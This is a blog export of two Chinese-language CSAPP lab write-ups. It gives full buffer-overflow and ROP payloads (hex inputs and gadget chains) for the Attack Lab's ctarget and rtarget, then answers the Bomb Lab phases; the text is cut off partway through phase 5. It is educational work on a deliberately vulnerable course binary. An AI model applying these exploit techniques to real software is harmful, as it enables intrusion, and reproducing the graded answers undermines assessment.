[{"content":"Attack lab 该实验在我电脑的wsl的ubuntu操作系统下无法正常运行，在debian环境下能正常运行，注意运行时要加上-q\nPart I:Code Injection Attacks Level 1 通过输入字符串，利用栈溢出原理，将getbuf函数的返回地址改成touch1函数的入口地址\n注意字节顺序\ngetbuf函数的反汇编代码\n1 2 3 4 5 6 7 8 9 00000000004017a8 \u0026lt;getbuf\u0026gt;: 4017a8:\t48 83 ec 28 sub $0x28,%rsp 4017ac:\t48 89 e7 mov %rsp,%rdi 4017af:\te8 8c 02 00 00 call 401a40 \u0026lt;Gets\u0026gt; 4017b4:\tb8 01 00 00 00 mov $0x1,%eax 4017b9:\t48 83 c4 28 add $0x28,%rsp 4017bd:\tc3 ret 4017be:\t90 nop 4017bf:\t90 nop phase_1.txt文件\n1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 运行命令\n1 ./hex2raw \u0026lt; phase_1.txt |./ctarget -q Level 2 level2需要将vlevel的值改成cookie值，再return到touch2函数入口处。\n修改后的rsp寄存器如下所示：\nphase_2.txt文件\n1 2 3 4 5 6 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 运行命令\n1 ./hex2raw \u0026lt; phase_1.txt |./ctarget -q 结果\n1 2 3 4 5 6 7 8 Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 Level3 本题与上题类似，不同点在于传的参数是一个字符串。先给出touch3的C语言代码\n1 2 3 4 5 6 7 8 9 10 11 12 void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } touch3中调用了hexmatch，它的C语言代码为：\n1 2 3 4 5 6 7 8 9 /* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } 也就是说，要把cookie转换成对应的字符串传进去\n注意第6行，s的位置是随机的，我们写在getbuf栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。\n因此，考虑把cookie的字符串数据存在test的栈上，其它部分与上题相同，这里不再重复思路。\n注入代码 先查找test栈顶指针的位置：\n0x5561dca8，这就是字符串存放的位置，也是调用touch3应该传入的参数，又touch3代码的地址为4018fa。从而得到代码：\n1 2 3 movq $0x5561dca8, %rdi pushq $0x4018fa ret 字节级表示为：\n1 2 3 4 5 6 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq 栈帧讲解 我们期望的栈帧为\n逻辑如下：\ngetbuf执行ret，从栈中弹出返回地址，跳转到我们注入的代码 代码执行，先将存在caller的栈中的字符串传给参数寄存器%rdi，再将touch3的地址压入栈中 代码执行ret，从栈中弹出touch3指令，成功跳转 Solution cookie0x59b997fa作为字符串转换为ASCII为：35 39 62 39 39 37 66 61\n注入代码段的地址与上题一样，同样为0x5561dc78\n由于在test栈帧中多利用了一个字节存放cookie，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的ASCII 。于是得到如下输入：\n1 2 3 4 5 6 7 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 攻击成功！\nPart II:Return-Oriented Programing 在第二部分中，我们要攻击的是rtarget，他的代码内容和第一部分一致，但采用了两种策略来阻止缓冲区溢出攻击\n栈随机化 这段程序分配的栈的位置正每次运行时都是随机的，这就使我们无法确定在哪里插入代码 限制可执行代码区域 也就是存放在栈上的代码不可执行，使得插入的恶意代码无法执行 针对这些防御措施，文档提供了攻击策略，即ROP：面向返回的程序设计，就是在已经存在的程序中找到特定的以ret结尾的指令序列为我们所用，称这样的代码段为gadget，把要用到部分的地址压入栈中，每次ret后又会取出一个新的gadget，于是这样就能形成一个程序链，实现我们的目的。我喜欢将这种攻击方式称作“就地取材，拼凑代码”。\n同时也给出指令编码表\n举个例子：\nrtarget有这样一个函数：\n1 2 3 4 void setval_210(unsigned *p) { *p = 3347663060U; } 它的汇编代码字节级表示为：\n1 2 3 0000000000400f15 \u0026lt;setval_210\u0026gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 查表可知，取其中一部分字节序列 48 89 c7 就表示指令movq %rax, %rdi，这整句指令的地址为0x400f15，于是从0x400f18开始的代码就可以变成下面这样：\n1 2 movq %rax, %rdi ret 这个小片段就可以作为一个gadget为我们所用。\n其它一些可以利用的代码都在文件farm.c中展示了出来\nlevel1 本题的任务和phase2相同，都是要求返回到touch2函数，phase2中用到的注入代码为\n1 2 3 movq $0x59b997fa, %rdi pushq $0x4017ec ret 由于我们无法找到这个特定值的gadget，所以我们可以先将我们需要的值写入栈中，再利用pop命令将其pop到rdi寄存器中，最后再返回touch2的函数起始地址，任务便完成。\n但是farm中找不到pop到rdi寄存器指令的gadget，所以我们另辟蹊径，先pop到rax中，再mov %rax，%rdi，即\n1 2 3 4 5 popq %rax ret ############# mov %rax,%rdi ret 逻辑如下：\ngetbuf执行ret，从栈中弹出返回地址，跳转到我们的gadget01 gadget01执行，将cookie弹出，赋值给%rax，然后执行ret，继续弹出返回地址，跳转到gadget2 gadget2执行，将cookie值成功赋值给参数寄存器%rdi，然后执行ret，继续弹出返回地址，跳转到touch2 Solution 首要问题是找到我们需要的gadget\n先用如下指令得到target的汇编代码及字节级表示\n1 objdump -d rtarget \u0026gt; rtarget.s 查表知，pop %rax用58表示，于是查找58\n1 2 3 00000000004019a7 \u0026lt;addval_219\u0026gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq retq 得到指令地址为0x4019ab\nmovq %rax, %rdi表示为48 89 c7，刚好能找到！其中 90 表示“空”，可以忽略\n1 2 3 00000000004019c3 \u0026lt;setval_426\u0026gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 得到指令地址为0x4019c5\n根据上图的栈帧，就能写出输入序列：\n1 2 3 4 5 6 7 8 9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 level2 来自官方的劝退哈哈哈，Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.\n这道题主要是在rtarget中返回到touch3，看似没有难度\nPhase 3中用到的注入代码为：\n1 2 3 movq $0x5561dca8, %rdi pushq $0x4018fa ret 其中0x5561dca8是栈中cookie存放的地址。\n在本题中由于栈随机化，不能直接将0x5561dca8地址直接给%rdi，可以利用%rsp的相对偏移量来获取cookie的存放地址，\n1 2 3 4 5 6 7 8 9 10 11 movq $0x30(%rsp), %rdi movq %rsp, %rax movq %rax, %rdi lea (%rdi,%rsi,1),%rax movq %rax, %rdi movl %eax, %edi movl %eax, %edx movl %esp, %eax movl %ecx, %esi pushq $0x4018fa ret 查表，movq %rsp, xxx表示为48 89 xx，查找一下有没有可用的gadget\n1 2 3 0000000000401aab \u0026lt;setval_350\u0026gt;: 401aab: c7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401ab1: c3 retq 还真找到了，48 89 e0对应的汇编代码为\n1 movq %rsp, %rax 地址为：0x401aad\n根据提示，有一个gadget一定要用上\n1 2 3 00000000004019d6 \u0026lt;add_xy\u0026gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 地址为：0x4019d6\n通过合适的赋值，这段代码就能实现%rsp加上段内偏移地址来确定cookie的位置\n剩下部分流程与Phase 3一致，大体思路如下：\n先取得栈顶指针的位置 取出存在栈中得偏移量的值 通过lea (%rdi,%rsi,1),%rax得到 cookie 的地址 将 cookie 的地址传给%rdi 调用touch 3 由于gadget的限制，中间的细节需要很多尝试，尝试过程不再一一列举了，直接给出代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #地址：0x401aad movq %rsp, %rax ret #地址：0x4019a2 movq %rax, %rdi ret #地址：0x4019cc popq %rax ret #地址：0x4019dd movl %eax, %edx ret #地址：0x401a70 movl %edx, %ecx ret #地址：0x401a13 movl %ecx, %esi ret #地址：0x4019d6 lea (%rdi,%rsi,1),%rax ret #地址：0x4019a2 movq %rax, %rdi ret 注意movl %ecx, %esi这条指令对应89 d1，截取下面部分\n1 2 3 0000000000401a6e \u0026lt;setval_167\u0026gt;: 401a6e:\tc7 07 89 d1 91 c3 movl $0xc391d189,(%rdi) 401a74:\tc3 按理说后面是91不是90(nop)，所以不能取，但在x86汇编中，0x91 表示 xchg eax, ecx 指令。这条指令的作用是交换 %eax 和 %ecx 寄存器的值。不影响寄存器的值，所以可以。\n栈帧讲解 为节省空间，每一行代码都省略了后面的ret，\n逻辑在图上标的很清楚，这里就不再用文字写啦！\n要注意，getbuf执行ret后相当于进行了一次pop操作，test的栈顶指针%rsp=%rsp+0x8，所以cookie相对于此时栈顶指针的偏移量是0x48而不是0x50\nSolution 根据上图的栈帧，写出输入序列：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ad 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 70 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8573152181181443583.jpg","permalink":"https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/","title":"CSAPP:attack实验"},{"content":"Bomb实验 题目解析 注意：本人所写的注释可能有些错误，有问题还请大家批评指正，注释中*的用法和C语言类似，有些寄存器名称没有带%\n题目只给了一个main函数，我们可以大致看出来，它的模式是从某个地方读取字符串，然后作为参数输入每个关卡phase_，进行验证。具体的情况没有显示，说明我们需要通过某种手段去进行探查：\n1 objdump -d bomb \u0026gt; bomb.s 同时看到bomb.c中：\n1 2 3 4 5 /* When run with no arguments, the bomb reads its input lines * from standard input. */ if (argc == 1) { infile = stdin; } 说明可以通过文件读取的方式进行读取。\n寄存器说明：\nPhase_1 关键代码\n1 2 3 4 5 6 7 8 9 0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp //将栈指针减少8，也就是入栈 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi 400ee9:\te8 4a 04 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; /*test指令同逻辑与and运算，但只设置条件码寄存器，不改变目的寄存器的值，test %eax,%eax用于测试寄存器%eax是否为空，由于寄存器%rax一般存放函数的返回值，此处应该存放的是函数 strings_not_equal的值，而%eax是%rax的低32位表示，所以不难分析出，当%eax值为0时，test的两个操作数相同且都为0，条件码ZF置位为1，即可满足下一行代码的跳转指令*/ 400eee:\t85 c0 test %eax,%eax 400ef0:\t74 05 je 400ef7 \u0026lt;phase_1+0x17\u0026gt; //当ZF位为0时，跳转到400ef7处 400ef2:\te8 43 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //调用explode-bomb函数，爆炸 400ef7:\t48 83 c4 08 add $0x8,%rsp //出栈 400efb:\tc3 ret 仅从函数调用的角度来看，phase_1的参数存在1st argument寄存器中：%rdi，然后这个参数作为第一个参数，与0x402400作为第二个参数一起被传入到strings_not_equal中，进行一些判定操作。\n0x402400像一个地址，使用gdb对程序进行debug，设置断点查看``0x402400的值，发现是Border relations with Canada have never been better.`，答案已找到\nPhase_2 关键代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp 400efd:\t53 push %rbx 400efe:\t48 83 ec 28 sub $0x28,%rsp //入栈，栈指针减少40 400f02:\t48 89 e6 mov %rsp,%rsi //将%rsp赋给%rsi(第二个参数寄存器) 400f05:\te8 52 05 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) //将(%rsp)与1比较 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; //若相等，则跳转到0x400f30 400f10:\te8 25 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //若不相等，则爆炸 400f15:\teb 19 jmp 400f30 \u0026lt;phase_2+0x34\u0026gt; 400f17:\t8b 43 fc mov -0x4(%rbx),%eax //(%rbx-4)取值后赋给eax寄存器 400f1a:\t01 c0 add %eax,%eax //eax=eax+eax 400f1c:\t39 03 cmp %eax,(%rbx) //比较%eax和(%rbx)的值 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; //如果相等，跳转到0x400f25 400f20:\te8 15 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //如果不相等，就爆炸 400f25:\t48 83 c3 04 add $0x4,%rbx //rbx寄存器+4 400f29:\t48 39 eb cmp %rbp,%rbx //%rbx与%rbp比较 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; //如果不相等，跳转到0x400f17 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; //跳转到400f3c 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx //(%rsp+4)后赋值给%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp //(%rsp+18)后再赋值给%rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; //跳转到0x40f17 400f3c:\t48 83 c4 28 add $0x28,%rsp //出栈，栈指针增加40 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 ret 可以看出这个阶段读取六个数字，并通过一个循环将其与对应的值对比，这些对应值的规律就是1 2 4 8 16 32，答案已出。\n（lea 0x18(%rsp),%rbp指令是将%rsp+40传给%rbp，lea指令用于计算有效地址，以及加法和有限的乘法运算，而其余如mov -0x4(%rbx),%eax则是取(%rbx-4)的值再传给%eax）\nPhase_3 关键代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp //入栈，栈指针减少24 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //%rsp+12赋给%rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //%rsp+8赋给%rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi //将0x4025cf赋给%esi 第二个参数寄存器 400f56:\tb8 00 00 00 00 mov $0x0,%eax //将0x0赋给%eax 400f5b:\te8 90 fc ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; //调用scanf输入函数 400f60:\t83 f8 01 cmp $0x1,%eax //比较返回值和0x1的大小,sscanf的返回值是成功解析和存储的参数数目。 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; //如果大于则跳转到0x400f6a 400f65:\te8 d0 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) //比较0x7和(%rsp+8)值的大小 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; //如果 (%rsp+8)\u0026gt;7 跳转到0x400fad即爆炸 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax //当(%rsp+8)\u0026lt;=7时，将(%rsp+8)的值放入%eax中 400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8) //跳转到存放在%rax*8+0x402470内存位置上的指令，即%eax*8+0x402470 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax //将0xcf赋给%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; //跳转到0x400fbe 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fad:\te8 88 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax //比较(%rsp+12)和%eax的值 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; //如果相等，则跳转到0x400fc9 400fc4:\te8 71 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //如果不相等，就爆炸 400fc9:\t48 83 c4 18 add $0x18,%rsp //出栈，栈指针增加24 400fcd:\tc3 ret 注意：jg指令是后面的操作数大于前面的操作数，不要弄反了\n首先根据sscanf函数确定有两个参数，刚好%rsp+8和%rsp+12没有赋值，于是推测这两个值对应这两个变量，接着由于sscanf函数返回参数的数目，所以必须输入两个数，并且第一个参数要小于等于7，最后根据下面这条关键指令判断第二个参数取决于第一个参数的值，使用gdb遍历打印相应的跳转地址的值，得到以下列表。\n最关键的指令是：\n400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (gdb) x/ *0x402470 第一个参数为0，第二个参数为0xcf 0x400f7c \u0026lt;phase_3+57\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/s *0x402478 第一个参数为1，第二个参数为0x137 311 0x400fb9 \u0026lt;phase_3+118\u0026gt;: \u0026#34;\\270\\067\\001\u0026#34; (gdb) x/ *0x402480 第一个参数为2，第二个参数为0x2c3 0x400f83 \u0026lt;phase_3+64\u0026gt;: \u0026#34;\\270\\303\\002\u0026#34; (gdb) x/ *0x402488 第一个参数为3，第二个参数为0x100 0x400f8a \u0026lt;phase_3+71\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x402490 第一个参数为4，第二个参数为0x185 0x400f91 \u0026lt;phase_3+78\u0026gt;: \u0026#34;\\270\\205\\001\u0026#34; (gdb) x/ *0x402498 第一个参数为5，第二个参数为0xce 0x400f98 \u0026lt;phase_3+85\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x4024a0 第一个参数为6，第二个参数为0x2aa 0x400f9f \u0026lt;phase_3+92\u0026gt;: \u0026#34;\\270\\252\\002\u0026#34; (gdb) x/ *0x4024a8 第一个参数为7，第二个参数为0x147 0x400fa6 \u0026lt;phase_3+99\u0026gt;: \u0026#34;\\270G\\001\u0026#34; Phase_4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 000000000040100c \u0026lt;phase_4\u0026gt;: 40100c:\t48 83 ec 18 sub $0x18,%rsp //入栈，栈指针减少18 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //rcx=rsp+12 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //rdx=rsp+8 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi //esi=0x4025cf 40101f:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 401024:\te8 c7 fb ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 401029:\t83 f8 02 cmp $0x2,%eax //比较eax和2 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; //如果不相等，跳转到0x401035即爆炸 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) //相等则比较(%rsp+8)的内存值和14 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; //如果(%rsp+8)\u0026lt;=14,跳转到0x40103a 401035:\te8 00 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 40103a:\tba 0e 00 00 00 mov $0xe,%edx //edx=14 参数3 40103f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 参数2 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi //edi=*(rsp+8) 参数1 401048:\te8 81 ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 40104d:\t85 c0 test %eax,%eax //判断返回值是否为0 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; //如果不等于0，跳转到401058即爆炸 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) //比较*(rsp+12)和0 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; //如果相等，跳转到40105d 401058:\te8 dd 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp //出栈 401061:\tc3 ret 很明显要通过此关必须在调用func4后返回0，而且第二个参数要等于0，所以只需通过调整第一个参数的值来使得func4函数返回0\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 0000000000400fce \u0026lt;func4\u0026gt;: 400fce:\t48 83 ec 08 sub $0x8,%rsp //入栈 400fd2:\t89 d0 mov %edx,%eax //eax=edx=14 rsi=0 edi=第一个参数 400fd4:\t29 f0 sub %esi,%eax //eax=eax-esi=14 400fd6:\t89 c1 mov %eax,%ecx //ecx=eax=14 400fd8:\tc1 e9 1f shr $0x1f,%ecx //ecx逻辑右移31位 ecx=0 400fdb:\t01 c8 add %ecx,%eax //eax=eax+ecx=14 400fdd:\td1 f8 sar %eax //eax算数右移一位 eax=7 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx //ecx=rsi+rax=7 400fe2:\t39 f9 cmp %edi,%ecx //比较edi和ecx=7 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; //若edi\u0026gt;=ecx 跳转到0x400ff2 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx //否则，edx=rcx-1=6 400fe9:\te8 e0 ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 edi esi=0 edx=13 400fee:\t01 c0 add %eax,%eax //eax=eax*2 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; 跳转到0x401007 400ff2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 400ff7:\t39 f9 cmp %edi,%ecx //比较edi和ecx=7 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; //若ecx\u0026gt;=edi 跳转到0x401007 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi //若ecx\u0026lt;edi，esi=rcx+1=8 400ffe:\te8 cb ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 edi esi=8 edx=14 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax //eax=rax+rax+1 不能经过这条指令，edi必须小于等于7 401007:\t48 83 c4 08 add $0x8,%rsp //出栈 40100b:\tc3 ret 首先edi寄存器也就是我们输入的第一个参数必须小于等于7，\nlea 0x1(%rax,%rax,1),%eax这条指令不能执行，一旦执行这条执行，那么eax寄存器就不可能等于0，同时我们观察到两个判断语句都有等于条件，于是我们把第一个参数设置为7，很顺利地使eax寄存器等于0，当然还有其它的可能性，可以一一去试。\n1 7 0 | Phase_5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx //保存调用者寄存器 401063:\t48 83 ec 20 sub $0x20,%rsp //入栈，栈指针减少32 401067:\t48 89 fb mov %rdi,%rbx //rbx=rdi 第一个参数 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax //将 %fs 段寄存器中偏移地址为 0x28 的内容加载到 %rax 寄存器中。 401071:\t00 00 //%fs 是一个段寄存器，通常用于访问线程本地存储（Thread Local Storage, TLS） 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) //将其放在栈上 *(rsp+24)=rax 401078:\t31 c0 xor %eax,%eax // eax=0 40107a:\te8 9c 02 00 00 call 40131b \u0026lt;string_length\u0026gt; 40107f:\t83 f8 06 cmp $0x6,%eax //字符串的长度与6比较 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; //若字符串的长度等于6，跳转到0x4010d2 401084:\te8 b1 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //从(rax+rbx)处读取的1字节数据零扩展到ecx中 ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //将cl的值存入rsp所指的地址中(rcx的低8位) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //从(rdx+0x4024b0)处读取的1字节数据零扩展到edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //将dl(edx的低8位)存入((rax+rsp)+16)地址中 *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //比较rax和6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //若rax!=6，则跳转到0x40108b 这部分的循环相当于以下C程序： for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } *(rsp+16)=0xb9 *(rsp+17)=0xbf *(rsp+18)=0xbe *(rsp+19)=0xb5 *(rsp+20)=0xb6 *(rsp+21)=0xb7 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) //否则，将字节0x0存入(rsp+22)地址中 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi //esi=0x40245e 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi //rdi=rsp+16 *(rsp+16)=0xbb 4010bd:\te8 76 02 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax //判断返回值是否为0 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; //返回值为0，则跳转到0x4010d9 4010c6:\te8 6f 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010d2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; //跳转到0x40108b 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax //rax=*(rsp+24) 4010de:\t64 48 33 04 